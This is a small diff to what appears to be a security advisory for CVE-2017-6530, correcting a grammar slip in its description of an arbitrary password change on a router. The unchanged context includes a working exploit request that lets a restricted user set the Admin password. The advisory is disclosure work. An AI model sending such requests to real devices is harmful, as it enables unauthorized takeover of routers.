@@ -68,7 +68,7 @@ Name: Arbitrary password change
 Severity: High
 CVE: CVE-2017-6530
 
-This is once more related insufficient access control and checks performed on the client side. Once logged in as the restricted user, 
+This is once more related to insufficient access control and checks performed on the client side. Once logged in as the restricted user, 
 we can modify the Admin user password using the following request:
 
 http://192.168.2.1/password.shtml?DeviceInfo.X_ATH-COM_TeleComAccount.Password=hax0rcito
